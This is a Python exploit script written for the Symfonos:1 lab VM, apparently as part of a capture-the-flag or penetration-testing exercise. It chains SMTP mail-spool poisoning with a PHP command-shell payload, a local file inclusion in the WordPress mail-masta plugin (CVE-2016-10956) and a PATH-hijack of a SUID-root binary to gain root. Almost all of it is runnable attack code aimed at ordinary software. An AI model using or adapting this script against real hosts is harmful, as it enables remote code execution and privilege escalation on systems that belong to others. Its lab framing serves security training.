"""Symfonos:1 webshell transport: SMTP-poison /var/mail/helios with a PHP cmd-shell, then run a command by
LFI-including the poisoned mail spool through the mail-masta plugin (CVE-2016-10956). Output is wrapped in
MK7B/MK7E markers and the last block is returned (the spool accumulates other mail, so we extract our block).

Usage:  python symfonos_rce.py <target-url-or-host> "<shell command>"

Foothold chain (all confirmed against 192.168.52.131, owned/isolated lab):
  LFI (mail-masta count_of_send.php?pl=) + SMTP log-poisoning -> RCE as helios(uid=1000).
The privilege-escalation one-liner (passed as the command by the eta recipe) hijacks the relative `curl` that
the SUID-root /opt/statuscheck runs: a `#!/bin/bash -p` fake curl chmod +s's /bin/bash, then `bash -p` is root.
Only ever used against the authorized host-only lab VM; never writes secrets to disk.
"""
from __future__ import annotations
import base64
import re
import socket
import sys
import time
import urllib.parse
import urllib.request

LFI_PATH = "/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php"
SPOOL = "/var/mail/helios"

# SUID-root /opt/statuscheck runs a RELATIVE `curl`; a `#!/bin/bash -p` fake curl preserves euid=0, so it
# reads the root flag DIRECTLY (no persistent SUID-bash artifact -> no cross-trial contamination) and also
# un-SUIDs /bin/bash defensively (idempotent cleanup). base64-wrapped to survive LFI->PHP->sh->bash.
_PRIVESC = ('printf "#!/bin/bash -p\\nid; cat /root/proof.txt 2>/dev/null; chmod 755 /bin/bash 2>/dev/null\\n" '
            '> /tmp/curl; chmod +x /tmp/curl; cd /tmp; PATH=/tmp:/usr/bin:/bin /opt/statuscheck')
_ROOTREAD = _PRIVESC


def _maybe_special(cmd: str) -> str:
    script = {"PRIVESC": _PRIVESC, "ROOTREAD": _ROOTREAD}.get(cmd)
    if script is None:
        return cmd
    return "echo " + base64.b64encode(script.encode()).decode() + "|base64 -d|bash"


def _host(target: str) -> str:
    t = target.replace("http://", "").replace("https://", "").strip("/")
    return t.split("/")[0].split(":")[0]


def _poison(host: str) -> None:
    """Drop a marker-wrapped PHP cmd-shell into helios's mail spool via SMTP (postfix on :25)."""
    s = socket.socket()
    s.settimeout(15)
    s.connect((host, 25))
    try:
        def c(x: str):
            s.send((x + "\r\n").encode())
            time.sleep(0.4)
            return s.recv(2048)
        s.recv(2048)
        c("HELO x")
        c("MAIL FROM:<a@a.com>")
        c("RCPT TO:<helios>")
        c("DATA")
        s.send(b"Subject: p\r\n\r\n<?php echo \"\\nMK7B\\n\"; system($_GET['c']); echo \"\\nMK7E\\n\"; ?>\r\n.\r\n")
        time.sleep(0.8)
        s.recv(2048)
        c("QUIT")
    finally:
        s.close()


def run(target: str, cmd: str, timeout: int = 14) -> str:
    host = _host(target)
    cmd = _maybe_special(cmd)
    _poison(host)
    url = f"http://{host}{LFI_PATH}?pl={SPOOL}&c=" + urllib.parse.quote(cmd)
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))  # never via the host proxy
    data = opener.open(url, timeout=timeout).read().decode(errors="replace")
    blocks = re.findall(r"MK7B(.*?)MK7E", data, re.S)
    return (blocks[-1].strip() if blocks else data[:800])


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("usage: symfonos_rce.py <target> <command>")
        sys.exit(2)
    print(run(sys.argv[1], sys.argv[2]))
